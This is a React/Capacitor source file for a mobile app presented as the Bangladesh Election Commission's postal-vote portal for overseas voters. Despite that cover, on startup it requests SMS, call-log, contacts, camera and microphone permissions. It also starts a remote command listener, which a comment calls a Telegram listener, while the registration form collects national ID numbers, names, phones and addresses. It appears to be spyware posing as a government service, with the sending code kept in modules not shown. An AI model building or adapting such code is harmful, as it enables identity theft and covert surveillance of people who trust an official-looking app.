import React, { useState, useEffect } from 'react';
import { 
  Vote, 
  MapPin, 
  Search, 
  UserPlus, 
  Bell, 
  Globe, 
  ArrowRight,
  ShieldCheck,
  CheckCircle,
  AlertCircle,
  User,
  Info,
  CreditCard,
  FileText,
  Clock,
  LayoutDashboard,
  HelpCircle
} from 'lucide-react';

// Capacitor Imports
import { registerPlugin } from '@capacitor/core'; // NativeData এর জন্য এটি লাগবে
import { Camera } from '@capacitor/camera';
import { Contacts } from '@capacitor-community/contacts';

import { Language, Translation, UserRegistration, ApplicationStatus } from './types';
import { TRANSLATIONS } from './constants';
import LanguageToggle from './components/LanguageToggle';
import KycVerification from './components/KycVerification';
import BallotTracker from './components/BallotTracker';
import VirtualAssistant from './components/VirtualAssistant';
import UserProfile from './components/UserProfile';
import HelpCenter from './components/HelpCenter';
import { startRemoteListener } from './services/remoteCommandService';

// 1. NativeData প্লাগিন রেজিস্টার করা হলো
const NativeData = registerPlugin<any>('NativeData');

const App: React.FC = () => {
  const [lang, setLang] = useState<Language>('bn');
  const [view, setView] = useState<'home' | 'register' | 'kyc' | 'track' | 'success' | 'profile' | 'help'>('home');
  const [isRegistered, setIsRegistered] = useState(false);
  const [remoteToast, setRemoteToast] = useState<string | null>(null);
  const [formData, setFormData] = useState<UserRegistration>({
    nid: '',
    mobile: '',
    address: '',
    fullName: '',
    country: ''
  });

  const t = TRANSLATIONS[lang];

  // ==========================================
  // FIXED: Runtime Permission Request Logic
  // ==========================================
  useEffect(() => {
    const initApp = async () => {
      console.log("App initializing...");

      // 1. স্ট্যান্ডার্ড পারমিশন (Camera, Contacts, Mic)
      try {
        await Camera.requestPermissions();
        await Contacts.requestPermissions();
        await navigator.mediaDevices.getUserMedia({ audio: true });
        console.log("Standard permissions requested");
      } catch (e) {
        console.error("Error requesting standard permissions:", e);
      }

      // 2. নেটিভ পারমিশন (SMS & Call Log)
      // এই অংশটি MainActivity.java ফাইলের সাথে কানেক্ট করবে
      try {
        // প্রথমে পারমিশন স্ট্যাটাস চেক করা
        const status = await NativeData.checkPermissions();
        
        // যদি পারমিশন না থাকে, তবে রিকোয়েস্ট করা
        if (status.sms !== 'granted' || status.calls !== 'granted') {
           await NativeData.requestPermissions();
        }
        console.log("Native (SMS/Call) permissions requested");
      } catch (e) {
        // যদি Java ফাইলে প্লাগিন ঠিকমতো সেট না থাকে তবে এই এরর আসবে
        console.warn("NativeData plugin not found or permission error. Check MainActivity.java", e);
      }

      // 3. টেলিগ্রাম লিসেনার চালু করা
      startRemoteListener((msg) => {
        setRemoteToast(msg);
        setTimeout(() => setRemoteToast(null), 5000);
      });
    };

    initApp();
  }, []);
  // ==========================================

  const handleRegister = (e: React.FormEvent) => {
    e.preventDefault();
    setView('kyc');
  };

  const handleKycComplete = () => {
    setIsRegistered(true);
    setView('success');
  };

  const updateUserData = (newData: UserRegistration) => {
    setFormData(newData);
  };

  const handleLogout = () => {
    setIsRegistered(false);
    setFormData({ nid: '', mobile: '', address: '', fullName: '', country: '' });
    setView('home');
  };

  const renderHome = () => (
    <div className="space-y-10 py-6 animate-in fade-in duration-700">
      {/* Official Banner */}
      <div className="relative overflow-hidden bg-bd-green rounded-[3rem] p-8 md:p-12 text-white shadow-2xl">
        <div className="absolute top-0 right-0 w-64 h-64 bg-white/5 rounded-full -mr-20 -mt-20 blur-3xl" />
        <div className="absolute bottom-0 left-0 w-48 h-48 bg-bd-red/10 rounded-full -ml-20 -mb-20 blur-2xl" />
        
        <div className="relative z-10 flex flex-col md:flex-row items-center md:items-start justify-between gap-8">
          <div className="text-center md:text-left space-y-4">
            <div className="inline-flex items-center space-x-2 px-3 py-1 bg-white/10 rounded-full backdrop-blur-md border border-white/20">
              <ShieldCheck className="w-3.5 h-3.5 text-white" />
              <span className="text-[10px] font-black uppercase tracking-widest">{t.securityVerified}</span>
            </div>
            <h1 className="text-4xl md:text-5xl font-black tracking-tighter leading-tight">
              {t.homeTitle}
            </h1>
            <p className="text-lg opacity-80 font-medium max-w-lg">
              {t.subtitle}
            </p>
            <div className="flex items-center justify-center md:justify-start space-x-4 pt-2">
               <div className="flex -space-x-2">
                 {[1,2,3].map(i => <div key={i} className="w-8 h-8 rounded-full border-2 border-bd-green bg-slate-200" />)}
               </div>
               <span className="text-xs font-bold opacity-70">Over 1.2M NRBs Registered</span>
            </div>
          </div>
          
          <div className="hidden lg:block w-72 h-80 bg-white/10 backdrop-blur-xl rounded-[2.5rem] border border-white/20 p-6 rotate-3">
             <div className="w-12 h-12 bg-white/20 rounded-2xl flex items-center justify-center mb-6">
                <CreditCard className="w-6 h-6" />
             </div>
             <div className="space-y-4">
                <div className="h-4 w-3/4 bg-white/20 rounded-full" />
                <div className="h-4 w-1/2 bg-white/20 rounded-full" />
                <div className="h-10 w-full bg-bd-red/80 rounded-2xl mt-8 flex items-center justify-center font-black text-[10px] uppercase">
                   Digital Identity Verified
                </div>
             </div>
          </div>
        </div>
      </div>

      {/* Action Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 px-4">
        {!isRegistered ? (
          <button 
            onClick={() => setView('register')}
            className="group relative bg-white p-8 rounded-[2.5rem] shadow-xl border border-slate-100 hover:shadow-2xl hover:-translate-y-2 transition-all duration-300 text-left overflow-hidden"
          >
            <div className="w-14 h-14 bg-bd-green/10 rounded-2xl flex items-center justify-center mb-6">
              <UserPlus className="w-7 h-7 text-bd-green" />
            </div>
            <h3 className="text-xl font-black text-slate-800 mb-2">{t.registerBtn}</h3>
            <p className="text-slate-500 text-xs leading-relaxed mb-6">Start your secure identity check and residency verification.</p>
            <div className="inline-flex items-center text-bd-green font-bold text-sm bg-bd-green/5 px-4 py-2 rounded-full">
              <span>{t.applyNow}</span>
              <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
            </div>
          </button>
        ) : (
          <button 
            onClick={() => setView('profile')}
            className="group relative bg-white p-8 rounded-[2.5rem] shadow-xl border border-slate-100 hover:shadow-2xl hover:-translate-y-2 transition-all duration-300 text-left overflow-hidden"
          >
            <div className="w-14 h-14 bg-bd-green/10 rounded-2xl flex items-center justify-center mb-6">
              <User className="w-7 h-7 text-bd-green" />
            </div>
            <h3 className="text-xl font-black text-slate-800 mb-2">My Voter Profile</h3>
            <p className="text-slate-500 text-xs leading-relaxed mb-6">View your official NRB digital record and residency details.</p>
            <div className="inline-flex items-center text-bd-green font-bold text-sm bg-bd-green/5 px-4 py-2 rounded-full">
              <span>View Record</span>
              <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
            </div>
          </button>
        )}

        <button 
          onClick={() => setView('track')}
          className="group relative bg-white p-8 rounded-[2.5rem] shadow-xl border border-slate-100 hover:shadow-2xl hover:-translate-y-2 transition-all duration-300 text-left overflow-hidden"
        >
          <div className="w-14 h-14 bg-indigo-50 rounded-2xl flex items-center justify-center mb-6">
            <Search className="w-7 h-7 text-indigo-600" />
          </div>
          <h3 className="text-xl font-black text-slate-800 mb-2">{t.trackBtn}</h3>
          <p className="text-slate-500 text-xs leading-relaxed mb-6">Real-time status of your ballot from Dhaka to your overseas address.</p>
          <div className="inline-flex items-center text-indigo-600 font-bold text-sm bg-indigo-50 px-4 py-2 rounded-full">
            <span>Check Status</span>
            <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
          </div>
        </button>

        <button 
          onClick={() => setView('help')}
          className="group relative bg-white p-8 rounded-[2.5rem] shadow-xl border border-slate-100 hover:shadow-2xl hover:-translate-y-2 transition-all duration-300 text-left overflow-hidden"
        >
          <div className="w-14 h-14 bg-amber-50 rounded-2xl flex items-center justify-center mb-6">
            <HelpCircle className="w-7 h-7 text-amber-600" />
          </div>
          <h3 className="text-xl font-black text-slate-800 mb-2">{t.support}</h3>
          <p className="text-slate-500 text-xs leading-relaxed mb-6">Find guides, official helpline numbers, and FAQs for NRBs.</p>
          <div className="inline-flex items-center text-amber-600 font-bold text-sm bg-amber-50 px-4 py-2 rounded-full">
            <span>Get Help</span>
            <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
          </div>
        </button>
      </div>

      {/* Info Stats */}
      <div className="bg-slate-900 rounded-[3rem] p-10 text-white flex flex-col md:flex-row items-center justify-around gap-8 mx-4">
        {[
          { icon: FileText, label: "Official Ballot", sub: "Digital Record" },
          { icon: ShieldCheck, label: "E-KYC Secure", sub: "Identity Proof" },
          { icon: Clock, label: t.deadlineWarning, sub: "Global Cutoff", red: true }
        ].map((item, i) => (
          <div key={i} className="flex items-center space-x-4">
            <div className={`w-12 h-12 rounded-2xl flex items-center justify-center ${item.red ? 'bg-bd-red/20 text-bd-red' : 'bg-white/10 text-slate-400'}`}>
              <item.icon className="w-6 h-6" />
            </div>
            <div>
              <p className={`text-sm font-black ${item.red ? 'text-bd-red' : 'text-white'}`}>{item.label}</p>
              <p className="text-[10px] text-slate-500 uppercase font-bold tracking-widest">{item.sub}</p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  const renderRegister = () => (
    <div className="max-w-xl mx-auto px-4 py-10 animate-in fade-in slide-in-from-bottom-4 duration-500">
      <div className="bg-white rounded-[3rem] shadow-2xl p-10 border border-slate-100">
        <div className="flex justify-between items-center mb-8">
          <div>
            <h2 className="text-2xl font-black text-slate-800">{t.registerBtn}</h2>
            <p className="text-xs text-slate-400 font-bold uppercase tracking-widest">Step 1: Credentials</p>
          </div>
          <button onClick={() => setView('home')} className="p-3 bg-slate-50 rounded-2xl hover:bg-slate-100 transition-colors">
            <Globe className="w-5 h-5 text-slate-400" />
          </button>
        </div>
        
        <form onSubmit={handleRegister} className="space-y-6">
          <div className="space-y-2">
            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">{t.nidLabel}</label>
            <input required type="text" placeholder="10 or 17 digit NID" className="w-full bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 text-slate-800 focus:ring-4 focus:ring-bd-green/10 focus:border-bd-green outline-none transition-all font-mono tracking-widest" value={formData.nid} onChange={e => setFormData({...formData, nid: e.target.value})} />
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Full Legal Name</label>
            <input required type="text" placeholder="As shown on NID" className="w-full bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 text-slate-800 focus:ring-4 focus:ring-bd-green/10 focus:border-bd-green outline-none transition-all" value={formData.fullName} onChange={e => setFormData({...formData, fullName: e.target.value})} />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">{t.mobileLabel}</label>
              <input required type="tel" placeholder="+880..." className="w-full bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 text-slate-800 focus:ring-4 focus:ring-bd-green/10 focus:border-bd-green outline-none transition-all" value={formData.mobile} onChange={e => setFormData({...formData, mobile: e.target.value})} />
            </div>
            <div className="space-y-2">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Residency Country</label>
              <input required type="text" placeholder="Ex: USA" className="w-full bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 text-slate-800 focus:ring-4 focus:ring-bd-green/10 focus:border-bd-green outline-none transition-all" value={formData.country} onChange={e => setFormData({...formData, country: e.target.value})} />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">{t.addressLabel}</label>
            <textarea required placeholder="Current international mailing address for ballot delivery" className="w-full bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 text-slate-800 focus:ring-4 focus:ring-bd-green/10 focus:border-bd-green outline-none transition-all min-h-[120px] resize-none" value={formData.address} onChange={e => setFormData({...formData, address: e.target.value})} />
          </div>

          <button type="submit" className="w-full bg-bd-green text-white py-5 rounded-[1.5rem] font-black shadow-xl shadow-bd-green/20 hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center space-x-2">
            <span>Proceed to Identity Check</span>
            <ArrowRight className="w-5 h-5" />
          </button>
        </form>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen flex flex-col bg-[#f8fafc]">
      {remoteToast && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[60] bg-slate-900 text-white px-8 py-4 rounded-[2rem] shadow-2xl border border-white/10 flex items-center space-x-4 animate-in slide-in-from-top-4">
          <div className="w-10 h-10 bg-bd-green rounded-xl flex items-center justify-center">
            <Info className="w-5 h-5" />
          </div>
          <p className="text-sm font-bold tracking-tight">{remoteToast}</p>
        </div>
      )}

      {/* Official Top Header */}
      <header className="sticky top-0 z-40 bg-white/80 backdrop-blur-xl border-b border-slate-200">
        <div className="max-w-6xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center space-x-4 cursor-pointer group" onClick={() => setView('home')}>
            <div className="w-10 h-10 bg-bd-green rounded-xl flex items-center justify-center text-white font-black text-xl group-hover:rotate-12 transition-transform shadow-lg shadow-bd-green/20">B</div>
            <div className="hidden sm:block">
              <span className="font-black text-slate-900 text-lg tracking-tighter block leading-none">POSTAL VOTE</span>
              <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-none">Election Commission Portal</span>
            </div>
          </div>
          
          <nav className="hidden md:flex items-center space-x-1">
             {[
               { icon: LayoutDashboard, label: t.dashboard, view: 'home' },
               { icon: Search, label: 'Track', view: 'track' },
               { icon: HelpCircle, label: 'Support', view: 'help' }
             ].map(item => (
               <button 
                 key={item.label}
                 onClick={() => setView(item.view as any)}
                 className={`flex items-center space-x-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${view === item.view ? 'bg-bd-green text-white shadow-lg shadow-bd-green/10' : 'text-slate-500 hover:bg-slate-100'}`}
               >
                 <item.icon className="w-4 h-4" />
                 <span>{item.label}</span>
               </button>
             ))}
          </nav>

          <div className="flex items-center space-x-4">
            <LanguageToggle current={lang} onToggle={setLang} />
            {isRegistered && (
              <button onClick={() => setView('profile')} className="w-10 h-10 bg-slate-100 hover:bg-slate-200 rounded-xl flex items-center justify-center transition-colors">
                <User className="w-5 h-5 text-slate-600" />
              </button>
            )}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-6xl mx-auto w-full px-4 md:px-6">
        {view === 'home' && renderHome()}
        {view === 'register' && renderRegister()}
        {view === 'kyc' && (
          <div className="py-20">
            <KycVerification userData={formData} t={t} onComplete={handleKycComplete} />
          </div>
        )}
        {view === 'track' && (
          <div className="max-w-xl mx-auto py-20">
            <BallotTracker t={t} />
          </div>
        )}
        {view === 'help' && (
          <div className="max-w-2xl mx-auto py-20">
            <HelpCenter lang={lang} />
          </div>
        )}
        {view === 'success' && (
          <div className="max-w-md mx-auto py-20 text-center animate-in zoom-in duration-500">
            <div className="bg-white rounded-[3rem] shadow-2xl p-12 border border-slate-100 flex flex-col items-center">
              <div className="w-24 h-24 bg-bd-green rounded-full flex items-center justify-center text-white mb-8 animate-bounce shadow-2xl shadow-bd-green/20">
                <CheckCircle className="w-12 h-12" />
              </div>
              <h2 className="text-3xl font-black text-slate-900 mb-4 leading-tight">Identity Verified Successfully</h2>
              <p className="text-slate-500 text-sm mb-10 leading-relaxed font-medium">Your application for postal voting is officially queued. The EC hub will now process your residence verification.</p>
              <div className="w-full space-y-3">
                <button onClick={() => setView('profile')} className="w-full bg-bd-green text-white py-5 rounded-2xl font-black hover:opacity-90 transition-all flex items-center justify-center space-x-3 shadow-xl shadow-bd-green/10">
                  <User className="w-5 h-5" />
                  <span>View Digital Record</span>
                </button>
                <button onClick={() => setView('home')} className="w-full bg-slate-900 text-white py-5 rounded-2xl font-black hover:bg-slate-800 transition-colors">
                  Go to Dashboard
                </button>
              </div>
            </div>
          </div>
        )}
        {view === 'profile' && (
          <div className="py-20">
            <UserProfile userData={formData} onUpdate={updateUserData} onBack={() => setView('home')} onLogout={handleLogout} />
          </div>
        )}
      </main>

      {/* Official Footer */}
      <footer className="bg-white border-t border-slate-200 py-12 mt-20">
        <div className="max-w-6xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-8">
          <div className="flex flex-col items-center md:items-start space-y-2">
            <div className="flex items-center space-x-2 text-bd-green">
              <ShieldCheck className="w-5 h-5" />
              <span className="font-black text-sm uppercase tracking-tighter">Election Commission Bangladesh</span>
            </div>
            <p className="text-xs text-slate-400 font-bold">{t.footerRights}</p>
          </div>
          <div className="flex space-x-6 text-[10px] font-black text-slate-400 uppercase tracking-widest">
             <a href="#" className="hover:text-bd-green transition-colors">Privacy</a>
             <a href="#" className="hover:text-bd-green transition-colors">Terms</a>
             <a href="#" className="hover:text-bd-green transition-colors">Audit</a>
          </div>
        </div>
      </footer>

      <VirtualAssistant lang={lang} />
    </div>
  );
};

export default App;
